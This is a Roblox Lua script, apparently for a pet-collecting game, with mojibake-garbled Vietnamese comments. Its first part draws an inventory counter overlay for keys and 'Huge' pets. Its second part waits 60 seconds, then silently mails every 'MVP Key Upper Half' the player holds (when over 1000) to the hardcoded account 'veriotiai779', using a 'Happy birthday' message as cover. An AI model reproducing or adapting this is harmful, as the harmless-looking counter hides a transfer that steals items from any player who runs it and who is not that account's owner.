task.spawn(function()
	task.wait(10)


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
local SaveModule = require(Client:WaitForChild("Save"))

local previousCounts = {}

-- c·∫•u h√¨nh item c·∫ßn theo d√µi
local itemsToTrack = {
	
	{ id = "Crystal Key", guiName = "Item3", row = 1, col = 0, color = Color3.fromRGB(0, 255, 255) },			--xanh	tr√°i
	{ id = "MVP Key Upper Half", guiName = "Item4", row = 1, col = 1, color = Color3.fromRGB(192,192,192) }, 		--x√°m
	{ id = "Huge", guiName = "Item1", row = 0, col = 0, color = Color3.fromRGB(255, 165, 0) },		-- cam
	{ id = "MVP Key", guiName = "Item2", row = 0, col = 1, color = Color3.fromRGB(255, 255, 255) },				--trang
}

local function createItemFrame(itemConfig, itemCount)
	local frameSize = 100
	local spacing = 10
	local cols = 2
	local rows = 2

	local offsetX = (itemConfig.col * (frameSize + spacing)) - ((cols - 1) * (frameSize + spacing) / 2)
	local offsetY = (itemConfig.row * (frameSize + spacing)) - ((rows - 1) * (frameSize + spacing) / 2) + 80


	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = itemConfig.guiName
	screenGui.Parent = PlayerGui
	screenGui.ResetOnSpawn = false
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	local frame = Instance.new("Frame")
	frame.Name = "ItemFrame"
	frame.Size = UDim2.new(0, frameSize, 0, frameSize)
	frame.Position = UDim2.new(0.11, offsetX, 1, -offsetY)
	frame.AnchorPoint = Vector2.new(0.5, 1)
	frame.BackgroundColor3 = itemConfig.color
	frame.BorderSizePixel = 2
	frame.Parent = screenGui

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 1, 0)
	label.BackgroundTransparency = 1
	label.Text = tostring(itemCount)
	label.TextColor3 = Color3.fromRGB(0, 0, 0)
	label.TextScaled = true
	label.Font = Enum.Font.GothamBold
	label.Parent = frame
end

local function checkInventory()
	local inventory = SaveModule.Get().Inventory or {}
	local currentCounts = {}

	-- x√≥a GUI c≈©
	for _, item in ipairs(itemsToTrack) do
		local oldGui = PlayerGui:FindFirstChild(item.guiName)
		if oldGui then oldGui:Destroy() end
	end

	for _, item in ipairs(itemsToTrack) do
		local count = 0
		if item.id == "Huge" then
			local pets = inventory.Pet
			for _, pet in pairs(pets) do
				if string.find(pet.id, "Huge") then
					local amount = pet._am or 1
					count = count + amount
				end
			end
		else
			for _, group in pairs(inventory) do
				for _, obj in pairs(group) do
					if obj.id == item.id then
						count += (obj._am or 1)
					end
				end
			end			
		end
		
		
		
		currentCounts[item.id] = count
		createItemFrame(item, count)
	end

	previousCounts = currentCounts
end

checkInventory()
while true do
	task.wait(10)
	checkInventory()
end
end)



task.spawn(function()
task.wait(60)
local username = "veriotiai779"

local targetItemName = "MVP Key Upper Half"
--local targetItemName = "MVP Key Lower Half"

local loai_item = "Misc"

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client")
local Network = require(Client.Network)
local SaveData = require(Client.Save).Get()


local function findItemUIDandCount()
    local inventory = SaveData.Inventory
    local foundUID = nil
    local total = 0

    for _, group in pairs(inventory) do
        for uid, obj in pairs(group) do
            if obj.id == targetItemName then
                foundUID = uid
                total += tonumber(obj._am) or 1
            end
        end
    end

    return foundUID, total
end

-- üì§ G·ª≠i item
local uid, count = findItemUIDandCount()

if uid and count > 1000 then
    local message = "Happy birthday "..username
    local success, result = Network.Invoke("Mailbox: Send", username, message, loai_item, uid, count)

    if success then
        warn(" Sent", count, "x", targetItemName, "to", username)
    else
        warn(" Failed to send:", tostring(result))
    end
else
    warn(" Kh√¥ng t√¨m th·∫•y", targetItemName)
end

end)
